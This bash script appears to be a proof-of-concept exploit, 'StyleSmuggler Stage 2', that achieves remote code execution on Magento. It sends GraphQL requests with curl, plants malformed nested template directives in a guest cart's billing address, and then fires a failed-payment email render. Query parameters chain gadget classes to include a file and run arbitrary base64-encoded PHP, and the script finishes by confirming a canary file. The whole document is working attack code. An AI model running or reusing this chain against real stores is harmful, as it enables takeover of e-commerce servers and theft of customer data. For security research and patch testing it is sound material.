#!/usr/bin/env bash
# Run the complete StyleSmuggler Stage 2 over HTTP with curl.
#
# Usage:
#   ./curl_failed_payment.sh /var/www/html/var/report/<report-id> [base64-php]
#
# To inspect every request in Burp:
#   BURP_PROXY=http://127.0.0.1:8082 ./curl_failed_payment.sh ...
set -euo pipefail

BASE_URL="${MAGENTO_URL:-http://localhost:18082}"
GRAPHQL="${BASE_URL%/}/graphql"
REPORT_PATH="${1:?pass the report path as seen by Magento PHP}"
EXPECTED_MARKER=""
if [[ $# -ge 2 ]]; then
    CODE_B64="$2"
else
    EXPECTED_MARKER="STYLESMUGGLER_CURL_RUN_$(openssl rand -hex 12)"
    CODE_B64="$(printf '%s' "file_put_contents(getcwd().chr(47).'stylesmuggler_curl.txt','$EXPECTED_MARKER');" | base64 -w0)"
fi

CURL=(curl --max-time 120 -sS)
if [[ -n "${BURP_PROXY:-}" ]]; then
    CURL+=(--proxy "$BURP_PROXY")
fi

graphql() {
    local body="$1"
    "${CURL[@]}" "$GRAPHQL" \
        -H 'Content-Type: application/json' \
        --data-binary "$body"
}

# Request 1, CreateEmptyCart creates the guest quote. It does not trigger a
# template gadget, and its response supplies the cart ID used below.
create_body='{"query":"mutation { createEmptyCart }"}'
create_response="$(graphql "$create_body")"
CART_ID="$(jq -er '.data.createEmptyCart' <<<"$create_response")"
printf '[*] cart id: %s\n' "$CART_ID"

# Request 2, SetGuestEmailOnCart supplies the email address used by the
# failed-payment notification.
email_body="$(jq -cn --arg cart "$CART_ID" '{
  query:"mutation SetEmail($cart: String!, $email: String!) { setGuestEmailOnCart(input:{cart_id:$cart,email:$email}) { cart { id email } } }",
  variables:{cart:$cart,email:"stylesmuggler-curl@example.invalid"}
}')"
graphql "$email_body" | jq .

# Request 3, SetBillingAddressOnCart stores the malformed nested directives.
# When the failed-payment service later formats this address, the bare framework
# filter incorrectly gives the unresolved Email Preview block its trust marker.
NESTED='{{if postcode}}{{var postcode}}{{/if}}{{/var}}{{if postcode}}{{var postcode}}{{/if}}{{if city}}{{block class=Magento\Email\Block\Adminhtml\Template\Preview}}{{/if}}'
billing_body="$(jq -cn --arg cart "$CART_ID" --arg nested "$NESTED" '{
  query:"mutation SetBilling($cart: String!, $address: CartAddressInput!) { setBillingAddressOnCart(input:{cart_id:$cart,billing_address:{address:$address,use_for_shipping:false}}) { cart { id billing_address { company postcode } } } }",
  variables:{cart:$cart,address:{firstname:"A",lastname:"B",company:$nested,street:["1 Bridge Street"],city:"x",postcode:"{{var postcode}}",country_code:"GB",telephone:"0"}}
}')"
graphql "$billing_body" | jq .

# Request 4 triggers all gadgets in the one server-side email render:
# marked address block -> Preview -> ColumnSet -> UrlGeneratorFactory ->
# S3Client -> with_resolved callback -> ArrayScanner -> include REPORT_PATH.
failed_body="$(jq -cn --arg cart "$CART_ID" '{
  query:"mutation FailedPayment($cart: String!, $payload: String!) { handlePayflowProResponse(input:{cart_id:$cart,paypal_payload:$payload}) { cart { id } } }",
  variables:{cart:$cart,payload:"RESULT=12&RESPMSG=Declined"}
}')"

"${CURL[@]}" "$GRAPHQL" \
    --url-query 'type=2' \
    --url-query 'text={{block class=Magento\Backend\Block\Widget\Grid\ColumnSet rowUrl=$this.template_styles}}' \
    --url-query "styles[first]=$REPORT_PATH" \
    --url-query 'styles[generatorClass]=Aws\S3\S3Client' \
    --url-query 'styles[version]=latest' \
    --url-query 'styles[region]=us-east-1' \
    --url-query 'styles[with_resolved][0][instance]=Magento\Setup\Module\Di\Code\Scanner\ArrayScanner' \
    --url-query 'styles[with_resolved][0][_i_]=Magento\Setup\Module\Di\Code\Scanner\ArrayScanner' \
    --url-query 'styles[with_resolved][1]=collectEntities' \
    --url-query "0=$CODE_B64" \
    -H 'Content-Type: application/json' \
    --data-binary "$failed_body"
printf '\n'

if [[ -n "$EXPECTED_MARKER" ]]; then
    canary="$("${CURL[@]}" "${BASE_URL%/}/stylesmuggler_curl.txt")"
    if [[ "$canary" != "$EXPECTED_MARKER" ]]; then
        printf "%s\n" "ERROR: the remote canary did not contain this run's marker" >&2
        exit 1
    fi
    printf '[+] RCE verified over HTTP: %s\n' "$canary"
fi
